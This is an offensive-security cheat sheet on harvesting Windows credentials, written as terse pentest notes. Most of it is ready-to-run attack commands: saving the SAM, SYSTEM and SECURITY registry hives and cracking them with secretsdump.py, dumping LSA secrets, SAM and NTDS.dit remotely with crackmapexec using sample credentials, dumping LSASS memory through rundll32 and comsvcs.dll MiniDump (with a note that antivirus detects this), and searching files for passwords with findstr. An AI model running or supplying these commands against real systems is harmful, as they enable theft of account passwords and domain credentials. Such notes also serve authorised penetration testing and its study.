# Cred Hunting

## Copying SAM Registry Hives

If we have local admin access on target, we could copy three registry SAM hives, which would help us to dump and crack hashes



| Registry Hive | Description                                                                         |
| ------------- | ----------------------------------------------------------------------------------- |
| HKLM\sam      | Hashes associated with local account passwords                                      |
| HKLM\system   | System bootkey, which is encryption/decryption key for SAM                          |
| HKLM\security | Cached credentials for domain accounts, it is not 100% needed, but would help a lot |

For dumping hives we would use reg.exe as admin

```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.
```

### Running secretsdump.py

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCA
```

## **Remote Dumping**

### **Dumping LSA Secrets Remotely**

```bash
crackmapexec smb 13.13.13.13 --local-auth -u amogus -p 1mp0st3r --lsa
```

### Dumping SAM Remotely&#x20;

```bash
crackmapexec smb 13.13.13.13 --local-auth -u amogus -p 1mp0st3r --sam
```

### Dumping  NTDS.dit Remotely

```bash
crackmapexec smb 13.13.13.13 -u amogus -p 1mp0st3r --ntds
```

## LSASS Dumping

**Rundll32.exe & Comsvcs.dll Method**

<mark style="color:red;">IMPORTANT: Anitivirus would see this as malicious activity.</mark> The point of method is that we use <mark style="color:blue;">**rundll32.exe**</mark> to call an exported function of <mark style="color:blue;">**comsvcs.dll**</mark> which also calls the **MiniDumpWriteDump** (**MiniDump**) function to dump the **LSASS** process memory to a specified directory (**C:\lsass.dmp**). But to do this we'll need a LSASS PID. with <mark style="color:blue;">**`tasklist /svc`**</mark> in **cmd** or <mark style="color:blue;">**`Get-Process lsass`**</mark> in **powershell**. With PID we could dump LSASS memory.

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 666 C:\lsass.dmp full
```

## Finding credentials with findstr

```powershell
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
